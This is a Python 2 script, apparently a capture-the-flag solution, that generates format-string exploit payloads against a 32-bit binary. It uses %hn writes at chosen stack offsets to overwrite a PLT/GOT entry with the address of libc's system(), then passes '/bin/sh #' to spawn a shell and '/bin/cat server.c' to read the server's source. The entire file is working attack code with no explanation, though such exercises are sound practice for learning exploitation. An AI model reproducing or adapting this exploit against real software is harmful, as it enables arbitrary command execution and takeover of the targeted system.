import struct, time, telnetlib
from socket import *



base_addr = 0xffffd354

#PAYLOAD 2: Write 'flagSize' address to a location
flagSize_addr = hex(base_addr + 4*6)
portion = int(flagSize_addr[-4:], 16)
exploit = "%"+str(portion-0x81)+"x%17$hn"
print exploit

#PAYLOD 3: Replace 'flagSize' with 0xffff
exploit = "%"+str(0x6c0-0x81)+"x%53$hn"
print exploit

def pad(buf):
    buf += "\x41"*(0x358-len(buf))
    buf += "\x90"*(0x360-len(buf))
    return buf

#Setup pointer to write to
def setup(address):
    stack_pos = base_addr + 4*18

    stack_msb = "{0:0{1}x}".format(stack_pos+2,8)
    stack_lsb = "{0:0{1}x}".format(stack_pos,8)
    addr_msb = "{0:0{1}x}".format(address+2,8)
    addr_lsb = "{0:0{1}x}".format(address,8)

    portion = int(stack_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%17$hn"
    print exploit
    portion = int(addr_msb[-8:-4], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%53$hn"
    print exploit
    portion = int(stack_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%17$hn"
    print exploit
    portion = int(addr_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%53$hn"
    print exploit

    stack_msb = "{0:0{1}x}".format(stack_pos+0x4+2,8)
    stack_lsb = "{0:0{1}x}".format(stack_pos+0x4,8)
    portion = int(stack_msb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%18$hn"
    print exploit
    portion = int(addr_lsb[-8:-4], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%55$hn"
    print exploit
    portion = int(stack_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%18$hn"
    print exploit
    portion = int(addr_lsb[-4:], 16)
    exploit = pad('')
    exploit += "%"+str(portion)+"x%55$hn"
    print exploit

#Write to the pointer prepared
def write(address):
    address = "{0:0{1}x}".format(address,8)

    exploit = "/bin/sh #"
    exploit = pad(exploit)
    msb = int(address[-8:-4], 16)
    exploit += "%"+str(msb)+"x%19$hn" #Carry->0x0804
    lsb = int(address[-4:], 16)
    if msb > lsb:
        lsb += 0x10000
    exploit += "%"+str(lsb-msb)+"x%20$hn"
    print exploit

system_libc = 0xf7e33b30
#printf setup
#setup(0x8049984)
#printf overwrite
#write(system_libc)

system_libc = 0xf7e33b30
#printf setup
setup(0x8049970)
#printf overwrite
write(system_libc)

#Break 0x80486a9
#Break 0x80486b7
#PLT 0x8049970

exploit = "\x90"*0x360 #Fill up input
exploit += "/bin/cat server.c"
print exploit
